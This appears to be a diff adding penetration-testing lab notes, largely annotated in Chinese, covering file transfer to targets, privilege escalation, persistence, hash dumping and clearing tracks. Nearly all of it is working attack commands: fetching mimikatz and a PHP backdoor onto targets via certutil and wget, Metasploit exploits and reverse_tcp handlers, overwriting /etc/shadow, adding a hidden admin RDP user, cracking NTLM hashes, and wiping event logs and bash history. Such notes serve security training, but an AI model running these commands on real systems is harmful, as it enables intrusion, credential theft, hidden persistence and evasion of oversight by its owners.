@@ -1,0 +1,354 @@
+Transferring Files To Windows & Linux Targets 3
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Setting Up A Web Server With Python
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	python -m SimpleHTTPServer 80
+	瀏覽器: http://ip
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Transferring Files To Windows Targets
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	傳輸Kali Linux 系統上/usr/share/windows-resources/mimikatz/x64目錄下的 mimikatz.exe 執行檔: 
+	cd /usr/share/windows-resources/mimikatz/x64
+	python3 -m http.server 80
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	meterpreter> 
+	cd C:\\
+	mkdir Temp
+	cd Temp
+	shell
+	certutil -urlcache -f http://10.10.31.3/mimikatz.exe mimikatz.exe
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Transferring Files To Linux Targets
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	將傳輸Kali 機器上/usr/share/webshel​​ls/php/目錄下的php-backdoor.php檔案
+	cd /usr/share/webshells/php/
+	python3 -m http.server 80
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	/bin/bash -i 
+	cd /tmp
+	wget http://192.217.117.2/php-backdoor.php
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Upgrading Shells : 
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	第一種技術涉及產生 bash 會話:
+	/bin/bash -i
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	使用 Python 產生 bash 會話:
+	python -c 'import pty; pty.spawn("/bin/bash")'
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Windows Privilege Escalation
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Windows：PrivescCheck
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	cmd: powershell
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	尋找可能的設定錯誤問題
+	cd C:\Users\student\Desktop\PrivescCheck
+	ls
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	執行 PrivescCheck.ps1 腳本
+	powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
+	
+	=> User > Identity
+	=> User > Group
+	=> User > Privileges
+	=> CREDS > WinLogon
+	=> UPDATES
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	發現了 WinLogon 憑證
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	runas.exe /user:administrator cmd
+	hello_123321
+	whoami
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	執行hta_server模組以獲得meterpreter shell
+	msfconsole -q
+	use exploit/windows/misc/hta_server
+	exploit
+	
+	[*] Using URL: http://10.10.38.3:8080/pEdwVmg.hta
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	cmd: mshta.exe http://10.10.38.3:8080/pEdwVmg.hta
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	sessions -i 1
+	cd C:\\Users\\Administrator\\Desktop
+	dir
+	cat flag.txt
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Linux Privilege Escalation 2
+	Permissions Matter!
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	nmap -sV -sC target.ine.local
+	8000/tcp open  http-alt ttyd/1.4.2-1f6a6c7 (libwebsockets/2.0.3)
+
+	[http://target.ine.local:8000]
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	尋找可寫入的檔案
+	find / -not -type l -perm -o+w 2>/dev/null
+	
+	/tmp
+	/etc/shadow
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	ls -l /etc/shadow
+	
+	-rw-rw-rw- 1 root shadow 523 Sep 23  2018 /etc/shadow
+	觀察到/etc/shadow是全域可寫的
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	cat /etc/shadow
+	
+	root:*:17764:0:99999:7:::
+	觀察root密碼沒有設定。在影子檔案中新增已知密碼可以升級為 root
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	使用 openssl 產生密碼條目
+	openssl passwd -1 -salt abc password
+	
+	$1$abc$BXBqpb9BZcZhXLgbee.0s/
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	複製產生的條目並將其新增至 /etc/shadow 
+	vim /etc/shadow
+	
+	root:$1$abc$BXBqpb9BZcZhXLgbee.0s/:17764:0:99999:7:::
+	:wq
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	su 
+	password
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	cd /root
+	ls -l
+	cat flag
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Editing Gone Wrong
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	尋找setuid程式方法開始
+	find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	尋找配置錯誤的 sudo
+	sudo -l
+	    (root) NOPASSWD: /usr/bin/man
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	sudo 執行 man 指令，而無需提供任何密碼
+	sudo man ls
+	MORE.. !/bin/bash
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	cd /root
+	ls -l
+	cat flag
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Windows Persistence 
+Maintaining Access: Persistence Service
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	nmap -sV -sC demo.ine.local
+	80/tcp    open  http               HttpFileServer httpd 2.3
+
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	msfconsole -q 
+	search hfs
+	use exploit/windows/http/rejetto_hfs_exec
+	set RHOSTS demo.ine.local
+	run
+
+	meterpreter > getuid
+	Server username: WIN-OMCNBKR66MN\Administrator
+
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	Windows 持久性服務安裝程式
+	use exploit/windows/local/persistence_service
+	set SESSION 1
+	run
+
+	meterpreter > getuid
+	Server username: NT AUTHORITY\SYSTEM
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	執行多處理程序以重新取得存取權限(後門)
+	msfconsole -q
+	use exploit/multi/handler
+	set LHOST 10.10.38.2
+	set PAYLOAD windows/meterpreter/reverse_tcp
+	set LPORT 4444
+	exploit
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	sessions -i 1
+	reboot
+	
+	=> Auto create meterpreter under /multi/handler
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	即使會話被殺死，我們也可以透過重新運行來再次獲得它
+	exit
+	msf6 exploit(multi/handler) > exploit
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Maintaining Access: RDP
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	nmap -sV -sC  demo.ine.local
+	80/tcp  open  http          BadBlue httpd 2.7
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	msfconsole -q
+	use exploit/windows/http/badblue_passthru
+	set RHOSTS demo.ine.local
+	run 
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	getuid
+	Server username: ATTACKDEFENSE\Administrator
+
+	ps -S explorer.exe
+	migrate 3848
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	將建立一個使用者並將該使用者新增至管理員群組
+	meterpreter > run getgui -e -u alice -p hack_123321
+
+	getgui”命令對目標機器進行以下更改：
+		如果 RDP 服務已停用，則啟用它
+		為攻擊者建立新用戶
+		從 Windows 登入畫面隱藏用戶
+		將已建立的使用者新增至「遠端桌面使用者」和「管理員」群組
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	xfreerdp /u:alice /p:hack_123321 /v:demo.ine.local
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Linux Persistence 2
+Maintaining Access I
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	nmap -sV -sC demo.ine.local
+	22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	| Username | Password | | student | password |
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	ssh student@demo.ine.local
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	ls -al
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	root> scp student@demo.ine.local:~/.ssh/id_rsa .
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	rm wait
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	chmod 400 id_rsa
+	ssh -i id_rsa student@demo.ine.local
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	ls -l
+	cat flag.txt
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+T1168: Local Job Scheduling
+	=> e.g cron, launchd
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	nmap -p- demo.ine.local
+	22/tcp open  ssh
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	檢查正在運行的進程 : 
+	ps -eaf
+
+	root          32       1  0 11:21 ?        00:00:00 /usr/sbin/cron
+	Cron 服務正在運行
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	建立一個 cron 作業: 將使用 SimpleHTTPServer python 模組來提供學生使用者主目錄中存在的檔案
+	echo "* * * * * cd /home/student/ && python -m SimpleHTTPServer" > cron
+	crontab -i cron
+	crontab -l
+	* * * * * cd /home/student/ && python -m SimpleHTTPServer
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	nmap -p- demo.ine.local
+	8000/tcp open  http-alt	
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	curl demo.ine.local:8000
+	<li><a href="flag.txt">flag.txt</a>
+
+	curl demo.ine.local:8000/flag.txt
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Dumping & Cracking Windows Hashes
+Windows: NTLM Hash Cracking
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	nmap -sV -sC demo.ine.local
+	80/tcp    open  http               BadBlue httpd 2.7
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	msfconsole -q
+		use exploit/windows/http/badblue_passthru
+		set RHOSTS demo.ine.local
+		run 
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	meterpreter > getsystem
+	ps -S lsass.exe
+	migrate 496
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	meterpreter > hashdump
+
+	Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+	bob:1009:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::
+	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	background (error)
+	creds
+	[-] Database not connected !!!!!!!!!!!!!!!!!!!!!!1
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	破解儲存的 NTLM hash 
+	use auxiliary/analyze/crack_windows
+	set CUSTOM_WORDLIST /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+	exploit
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	nano ntml_hash (work)
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	gzip -d /usr/share/wordlists/rockyou.txt.gz
+	hashcat -m 1000 -a 0 ntml_hash /usr/share/wordlists/rockyou.txt
+	
+	8846f7eaee8fb117ad06bdd830b7586c:password                 
+	5835048ce94ad0564e29a924a03510ef:password1                
+	31d6cfe0d16ae931b73c59d7e0c089c0:    
+	
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	在使用資料庫之前啟動 postgresql 伺服器
+	/etc/init.d/postgresql start
+	
+	使用msfdb init建立並初始化 msf 資料庫
+	msfdb init
+	
+	確認 Metasploit 已成功連線到資料庫
+	msf > db_status
+	
+	將當前工作區更改為“msfu”
+	msf > workspace msfu
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	Check port open : netstat -tuplen
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	Msf database : 
+	db_disconnect
+	db_connect root1:roo1@127.0.0.1:5432/main
+	
+	postgresql:
+	sudo su postgres
+	postgres@INE:/root$ psql
+	postgres=# CREATE USER root1 WITH SUPERUSER PASSWORD 'roo1';
+	
+	列出現有用戶: 
+	\du
+	ALTER USER yourusername WITH PASSWORD 'yournewpass';
+	
+	建立資料庫: 
+	CREATE DATABASE main;
+	
+	顯示資料庫
+	\list
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Dumping & Cracking Linux Hashes -- Password Cracker: Linux
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	/etc/init.d/postgresql start
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	use post/linux/gather/hashdump
+	set SESSION 1
+	exploit
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	use auxiliary/analyze/crack_linux
+	set SHA512 true
+	run
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Pivoting Overview -- Pivoting
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	run autoroute -s 10.0.16.0/20
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+清除 Windows 事件日誌  (Event log)
+	Clearing Your Tracks On Windows : meterpreter : clearev
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+清除 Linux 上的痕跡
+	Clearing Your Tracks On Linux: /bin/bash -i
+	所有活動都會以 bash 歷史記錄的形式記錄: 
+	=> history -c
+	刪除 .bash_history 檔案的內容來清除 bash 歷史記錄
+	=> cat /dev/null > ~/.bash_history
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
